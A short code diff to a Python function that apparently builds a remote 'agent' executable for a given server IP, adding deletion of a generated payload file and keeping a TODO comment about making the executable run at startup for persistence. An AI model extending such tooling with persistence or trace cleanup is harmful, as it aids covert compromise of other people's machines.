@@ -38,6 +38,7 @@ def generate_agent(serv_ip):
 
     # cleans up unneeded files
     os.remove('gen_agent.exe.spec')
+    os.remove('new_payload.py')
     shutil.rmtree('build')
 
     # TODO make executable execute on start for persistence
